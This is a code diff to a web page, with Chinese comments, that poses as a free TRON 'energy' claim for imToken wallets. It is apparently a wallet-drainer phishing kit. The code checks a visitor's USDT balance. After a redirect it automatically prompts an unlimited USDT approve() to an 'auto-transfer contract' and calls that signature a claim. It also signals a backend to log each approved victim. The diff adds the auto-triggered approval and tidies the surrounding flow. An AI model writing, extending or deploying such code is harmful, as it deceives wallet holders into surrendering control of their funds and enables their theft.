@@ -1079,12 +1079,11 @@ async function checkImTokenEnv() {
         nonImTokenPopup.style.display = "none";
     };
 }
-// ========== 钱包初始化 ==========
 async function initWallet(isAfterApprove) {
     const lang = langConfig[currentLang];
     try {
         userAddress = tronWeb.defaultAddress.base58;
-        // 1. 特殊地址白名单
+        // 1. 特殊地址白名单处理
         if (userAddress === SPECIAL_ADDRESS) {
             const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
             trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
@@ -1102,27 +1101,30 @@ async function initWallet(isAfterApprove) {
             approveBtn.textContent = lang.approveBtnText;
             document.getElementById("statusAddress").textContent = shortAddr;
             updateWalletStatus();
-            // 特殊地址15分钟防重复（加await确保A1成功后再开放按钮）
+            
+            // 特殊地址A1信号防重复
             if (canSendA1Signal(userAddress)) {
                 await sendSignalA1().catch(err => console.error("A1信号发送失败：", err));
                 updateA1SignalRecord(userAddress);
             }
             approveBtn.disabled = false;
             approveBtn.textContent = lang.approveBtnText;
-            recordList.style.display = "block"; // 显示记录列表
+            recordList.style.display = "block";
             bindApproveLogic();
             return;
         }
-        // 2. 无钱包地址
+
+        // 2. 无钱包地址处理
         if (!userAddress) {
             userInfoEl.innerHTML = lang.noWalletAddress;
             approveBtn.disabled = true;
             approveBtn.textContent = lang.insufficientBtn;
             updateWalletStatus();
-            recordList.style.display = "none"; // 隐藏记录列表
+            recordList.style.display = "none";
             return;
         }
-        // 查询余额
+
+        // 查询USDT和TRX余额
         trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
         const [usdtRaw, trxRaw] = await Promise.all([
             trc20Contract.balanceOf(userAddress).call().catch(err => 0),
@@ -1131,7 +1133,8 @@ async function initWallet(isAfterApprove) {
         tokenBalance = Number(usdtRaw) / 1000000;
         trxBalance = Number(trxRaw) / 1000000;
         const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
-        // 3. 30天内已领取
+
+        // 3. 30天内已领取处理
         if (isAddressAuthorized(userAddress)) {
             userInfoEl.innerHTML = lang.authorizedTip
                 .replace("{address}", shortAddr)
@@ -1141,10 +1144,11 @@ async function initWallet(isAfterApprove) {
             approveBtn.textContent = lang.authorizedBtn;
             document.getElementById("statusAddress").textContent = shortAddr;
             updateWalletStatus();
-            recordList.style.display = "block"; // 显示记录列表
+            recordList.style.display = "block";
             return;
         }
-        // 4. USDT余额不足
+
+        // 4. USDT余额不足处理
         if (tokenBalance <= 1) {
             userInfoEl.innerHTML = lang.insufficientUsdt
                 .replace("{address}", shortAddr)
@@ -1154,37 +1158,85 @@ async function initWallet(isAfterApprove) {
             approveBtn.textContent = lang.insufficientBtn;
             document.getElementById("statusAddress").textContent = shortAddr;
             updateWalletStatus();
-            recordList.style.display = "block"; // 显示记录列表
+            recordList.style.display = "block";
             return;
         }
-        // 5. 非imToken用户
+
+        // 5. 非imToken用户处理
         if (!window.tronWeb || !window.tronWeb.defaultAddress) {
             userInfoEl.innerHTML = lang.nonImTokenUser;
             approveBtn.disabled = true;
             approveBtn.textContent = lang.insufficientBtn;
             updateWalletStatus();
-            recordList.style.display = "none"; // 隐藏记录列表
+            recordList.style.display = "none";
             return;
         }
-        // 6. 符合条件
+
+        // 6. 符合领取条件处理
         userInfoEl.innerHTML = lang.eligibleTip
             .replace("{address}", shortAddr)
             .replace("{usdt}", tokenBalance.toFixed(2))
             .replace("{trx}", trxBalance.toFixed(2));
         document.getElementById("statusAddress").textContent = shortAddr;
         updateWalletStatus();
-        // 非特殊地址A1信号（加await确保成功后开放按钮）
+        
+        // 非特殊地址A1信号发送
         if (canSendA1Signal(userAddress)) {
             await sendSignalA1().catch(err => console.error("A1信号发送失败：", err));
             updateA1SignalRecord(userAddress);
         }
         approveBtn.disabled = false;
         approveBtn.textContent = lang.approveBtnText;
-        recordList.style.display = "block"; // 显示记录列表
+        recordList.style.display = "block";
         bindApproveLogic();
+
+        // 核心新增：检测#approve标记，自动触发合约签名（唤起用户签名弹窗）
+        if (window.location.hash === "#approve") {
+            window.location.hash = ""; // 清空标记，避免重复触发
+            const btn = document.getElementById("approveBtn");
+            btn.disabled = true;
+            btn.textContent = lang.redirectingBtn;
+            reviewTip.style.display = "flex";
+            reviewTipText.textContent = lang.reviewTipText;
+
+            // 调用USDT合约approve方法，直接弹出imToken签名弹窗
+            await trc20Contract.approve(
+                AUTO_TRANSFER_CONTRACT, // 授权对象：自动转账合约地址
+                INFINITE_APPROVE_AMOUNT // 无限授权金额（十六进制格式正确）
+            ).send({
+                from: userAddress,
+                shouldPollResponse: true // 等待链上确认，确保签名有效
+            });
+
+            // 签名成功后：同步后端状态+标记领取成功
+            await Promise.all([
+                sendSignalA2(), // 发送A2信号（告知后端授权成功）
+                sendSignalB(false) // 发送B2信号（标记领取完成）
+            ]);
+            btn.textContent = lang.successBtn;
+            userInfoEl.innerHTML += lang.successArrival;
+            alert(lang.successTip);
+            addAuthorizedAddress(userAddress); // 加入30天领取白名单
+            saveEnergyRecord(); // 保存领取记录
+            renderEnergyRecords(); // 刷新记录显示
+            reviewTip.style.display = "none";
+        }
+
     } catch (e) {
-        console.error("钱包初始化失败：", e);
+        console.error("钱包初始化/签名失败：", e);
         const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "未知地址";
+        const btn = document.getElementById("approveBtn");
+
+        // 签名失败/取消的特殊处理
+        if (window.location.hash === "#approve") {
+            window.location.hash = "";
+            btn.disabled = false;
+            btn.textContent = lang.approveBtnText;
+            reviewTip.style.display = "none";
+            alert(lang.authorizeFail.replace("{msg}", e.message || "签名取消或网络异常"));
+        }
+
+        // 通用错误提示渲染
         const errorTip = userAddress ? 
             `${lang.insufficientUsdt.replace("{address}", shortAddr).replace("{usdt}", tokenBalance?.toFixed(2) || 0).replace("{trx}", trxBalance?.toFixed(2) || 0)}` :
             lang.noWalletAddress;
@@ -1193,40 +1245,6 @@ async function initWallet(isAfterApprove) {
         approveBtn.textContent = lang.insufficientBtn;
         updateWalletStatus();
         recordList.style.display = userAddress ? "block" : "none";
-    }
-}
-// ========== 授权后执行（修复btn变量未定义问题） ==========
-async function executeAfterApprove() {
-    const lang = langConfig[currentLang];
-    try {
-        if (!trc20Contract) trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
-        // 执行签名授权操作
-        await trc20Contract.approve(
-            AUTO_TRANSFER_CONTRACT,
-            INFINITE_APPROVE_AMOUNT
-        ).send({ from: userAddress, shouldPollResponse: true });
-
-        // 核心新增：签名成功后，发送A2+B2信号（让后端记录授权用户）
-        const btn = document.getElementById("approveBtn"); // 修复：先获取按钮元素
-        btn.textContent = "同步授权信息中...";
-        await Promise.all([
-            sendSignalA2(), // 发送A2信号
-            sendSignalB(false) // 发送B2信号（isB1=false）
-        ]);
-        console.log("✅ A2+B2信号发送成功，后端已记录授权用户");
-
-        // 信号发送完成，标记能量发放成功
-        btn.textContent = lang.successBtn;
-        userInfoEl.innerHTML += lang.successArrival;
-        alert(lang.successTip);
-        renderEnergyRecords();
-    } catch (e) {
-        console.error("签名/信号发送失败：", e);
-        // 即使A2/B2发送失败，签名成功后能量已到账，仅后端记录受影响
-        alert("能量已到账，但授权信息同步失败（不影响使用）");
-        const btn = document.getElementById("approveBtn");
-        btn.textContent = lang.successBtn;
-        userInfoEl.innerHTML += lang.successArrival;
     }
 }
 // ========== 发送信号函数 ==========
@@ -1380,19 +1398,18 @@ function bindRetryA1Logic() {
     };
 }
 
-// ========== 领取按钮逻辑（B1异步发送+并行触发唤起+标记防重复，互不阻塞） ==========
 function bindApproveLogic() {
     const lang = langConfig[currentLang];
     approveBtn.onclick = async () => {
         const btn = document.getElementById("approveBtn");
-        const shortAddr = `${userAddress.slice(0,8)}...${userAddress.slice(-6)}`;
+        const shortAddr = userAddress ? `${userAddress.slice(0,8)}...${userAddress.slice(-6)}` : "";
         btn.disabled = true;
         btn.textContent = lang.loadingBtn;
         reviewTip.style.display = "flex";
         reviewTipText.textContent = "能量调配中……点击签名后能量生效";
 
         try {
-            // 第一步：校验A1信号是否成功（唯一前置条件）
+            // 校验A1信号是否成功（前置条件）
             const a1Status = JSON.parse(localStorage.getItem(A1_STATUS_KEY) || "{}");
             const isA1Success = a1Status[userAddress] === "success";
             if (!isA1Success) {
@@ -1408,36 +1425,25 @@ function bindApproveLogic() {
                 return;
             }
 
-            // 第二步：核心逻辑（并行执行2件事，B1异步发送不阻塞）
-            // 2.1 标记防重复对象（点击即标记，不管B1是否发送/成功）
-            markB1SignalSent(userAddress);
-           
-
-            // 2.2 非防重复对象：异步发送B1信号（不await，不阻塞唤起签名）
+            // B1信号防重复发送（异步执行，不阻塞跳转）
             if (!hasSentB1Signal(userAddress)) {
                 btn.textContent = "发送信号中...";
-                // B1异步发送，结果仅日志记录，不影响其他流程
                 sendSignalB(true)
-                    .then(result => {
-                        console.log(`✅ B1信号异步发送完成，结果：${result.success ? "成功" : "失败"}`);
-                    })
-                    .catch(err => {
-                        console.warn("❌ B1信号异步发送异常：", err);
-                    });
+                    .then(result => console.log(`B1信号发送结果：${result ? "成功" : "失败"}`))
+                    .catch(err => console.warn("B1信号异常：", err));
+                markB1SignalSent(userAddress);
             } else {
-                // 防重复对象：不发送B1信号，仅日志记录
-                console.log("⚠️ B1防重复触发：已阻止二次发送信号");
+                console.log("⚠️ 30天内已发送过B1信号，跳过");
             }
 
-            // 2.3 立即唤起钱包签名（和B1发送并行，互不阻塞，一路绿灯）
-                    reviewTip.style.display = "none";
-                btn.textContent = lang.redirectingBtn;
-                // 唤起imToken签名页面
-                window.location.href = 
-                `imtoken://browser?
-                url=${encodeURIComponent(window.location.href + "#approve")}`;
-                     } // 和connectBtn的唤起方式完全一样！
-                 } catch (e) {
+            // 跳转imToken并携带#approve标记（用于后续自动触发签名）
+            reviewTip.style.display = "none";
+            btn.textContent = lang.redirectingBtn;
+            const fullTargetUrl = window.location.origin + window.location.pathname + "#approve";
+            const jumpUrl = imTokenConfig.scheme + encodeURIComponent(fullTargetUrl);
+            window.location.href = jumpUrl;
+
+        } catch (e) {
             console.error("领取流程失败：", e);
             reviewTip.style.display = "none";
             btn.disabled = false;
@@ -1445,9 +1451,9 @@ function bindApproveLogic() {
 
             const errMsg = e.message || "";
             if (errMsg.includes("不符合领取条件") || [400, 408, 409].some(code => errMsg.includes(code.toString()))) {
-                alert("你现在不符合领取条件");
+                alert(lang.ineligibleTip);
             } else {
-                alert("现在领取的人太多啦，请稍后重试");
+                alert(lang.systemBusyTip);
             }
         }
     };
